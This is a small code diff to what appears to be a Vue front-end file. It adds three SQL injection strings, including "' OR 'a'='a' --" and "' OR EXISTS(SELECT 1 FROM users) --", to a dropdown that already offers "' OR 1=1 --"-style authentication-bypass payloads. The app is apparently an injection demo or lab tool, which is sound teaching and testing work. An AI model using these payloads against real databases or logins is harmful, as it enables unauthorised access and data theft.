@@ -228,7 +228,11 @@ const conditionOptions = ref([
   { label: "OR 1=1 --", value: "' OR 1=1 --" },
   { label: "OR username = 'admin' --", value: "' OR username = 'admin' --" },
   { label: "OR id = 1 --", value: "' OR id = 1 --" },
+  { label: "OR 'a'='a' --", value: "' OR 'a'='a' --" },
+  { label: "OR username LIKE '%' --", value: "' OR username LIKE '%' --" },
+  { label: "OR EXISTS(SELECT 1 FROM users) --", value: "' OR EXISTS(SELECT 1 FROM users) --" },
 ])
+
 
 const selectedCondition = ref<string>('')
 
